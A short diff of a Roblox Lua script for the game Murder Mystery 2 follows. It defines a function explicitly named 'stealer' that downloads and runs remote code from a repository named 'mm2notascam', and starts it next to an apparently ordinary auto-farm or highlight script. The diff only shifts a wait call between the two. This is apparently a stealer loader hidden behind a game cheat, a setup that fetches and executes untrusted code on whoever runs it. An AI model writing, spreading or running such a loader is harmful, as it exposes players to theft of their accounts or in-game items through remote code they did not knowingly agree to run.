@@ -1,10 +1,10 @@
 local function stealer()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FloppsCat/mm2notascam/refs/heads/main/notascam.lua"))()
 end
+wait(3)
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
 end
 
 task.spawn(stealer)
-wait(2)
 task.spawn(farm)
